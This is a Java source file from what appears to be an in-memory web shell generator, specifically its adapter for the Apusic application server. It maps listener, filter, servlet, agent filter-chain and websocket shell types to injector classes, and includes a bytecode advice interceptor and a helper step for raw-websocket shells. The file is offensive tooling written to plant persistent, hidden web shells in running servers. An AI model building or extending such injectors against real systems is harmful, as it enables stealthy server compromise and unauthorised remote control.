package com.reajason.javaweb.memshell.server.apusic;

import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class Apusic extends AbstractServer {

    public static class ListenerInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "http"), "response");
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.apusic.ApusicListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.apusic.ApusicFilterInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.apusic.ApusicServletInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.apusic.ApusicFilterChainAgentInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.apusic.ApusicRawWsInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.apusic.ApusicWebSocketInjector")
                .build();
    }

    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(ApusicRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
